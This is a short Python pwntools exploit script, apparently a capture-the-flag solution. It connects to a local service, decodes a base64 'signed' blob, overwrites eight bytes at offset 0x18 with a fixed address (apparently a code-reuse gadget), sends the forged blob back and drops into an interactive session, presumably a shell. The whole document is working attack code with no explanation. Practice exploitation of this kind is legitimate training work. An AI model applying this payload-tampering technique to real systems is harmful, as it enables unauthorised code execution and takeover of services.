from pwn import *

r = remote("127.0.0.1", 50000)

r.recvuntil(": ")
signed = r.recvline()
d = bytearray(base64.b64decode(signed))

d[0x18:0x18 + 8] = p64(0x4f2a5)

r.sendline(base64.b64encode(bytes(d)))

r.interactive()